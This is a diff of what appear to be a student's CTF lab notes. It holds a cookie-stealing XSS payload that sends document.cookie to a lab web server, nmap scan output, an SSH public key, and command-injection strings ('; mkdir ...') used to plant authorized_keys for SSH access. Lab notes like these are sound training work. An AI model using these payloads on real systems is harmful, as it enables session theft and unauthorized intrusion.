@@ -105,7 +105,7 @@ echo "your key from the cat" > /var/www/.ssh/authorized_keys
 # Demo
 ```
 python3 -m http.server # This makes a webserver
-<script>document.location="http://10.50.30.231:8000/"+document.cookie;</script> # This script steals cookies from users and sends it to our webserver
+<script>document.location="http://10.50.39.224:8000/"+document.cookie;</script> # This script steals cookies from users and sends it to our webserver
 ```
 # CTF
 ```
@@ -126,14 +126,38 @@ PORT     STATE SERVICE
 
 
 
+map scan report for 10.100.28.33
+Host is up (0.00031s latency).
+All 1000 scanned ports on 10.100.28.33 are closed
 
+Nmap scan report for 10.100.28.34
+Host is up (0.00043s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+53/tcp open  domain
 
+Nmap scan report for 10.100.28.35
+Host is up (0.00041s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+53/tcp open  domain
 
+Nmap scan report for 10.100.28.48 and 40
+Host is up (0.00046s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+4444/tcp open  krb524
 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCqbKV61PY2E5VOANSMe2mTjMvYofPXYSWBrmCJ6eepiRvLXAJSjU9cZ3x+qYPZy2nfhQxtgDMnwiGfc6QapSViNIVMPLoT7e3VHbfmkDCOGnpCk2KjsWm7hd4Ts3XWncbl9fyR36MiUr0ng/b3gVRmIWZjxAUx8BKt3OVUZCwo+JKGVDiJTqfYeeqSmQUJmPzcqX1MyVscyXmiBV84X4qWfIOV2WitK1u6V5ZG/OgX78rOSZRWN6CtieMspicpxkPg7yKMJ523tHkfUSKJPf8j/Qh9O1jRk+D+pYx6KH3EsExOhdx1816CT+IffPS/C9bfLGgZmtCO82a1UWzolldB9TWOl+7RDljgxvYn5uGrqOCmtGnSSkpsSfnzFM5xEyUi3ea30n/WqXOBuaKD/cvMZ9qocHeD9I1ZalalZF4TgqD6AzoA+a6DDrfw2n7+NmDnzMX9huFFESIxFl7TjsRqjWJS3XpTSKUkWukBr5FPp69uw4zYrASYLbp2xDSZBCo2JAk+MFz/UG38gBgYfjVwCwFrnJEUBoCGGlflxtWPXKfggGytMnlXTZjFTM3hGSM5nSEj2L2Lu06Peij9KyTojvSkwWJVVYp7w+aZ7x5M2RXBCagieARzTpytrGJE8Q+QsLJWAwlPZ7W8FokNvYlIFqQf1Jq81hb8dS0BsrbDsw== student@lin-ops
 
+from the web server
 
+; mkdir /home/billybob/.ssh
+; mkdir /var/www/.ssh
 
-
+then you can ssh after the echo cmmands usinf "authorized_keys"
+10.100.28.55
 
 
 
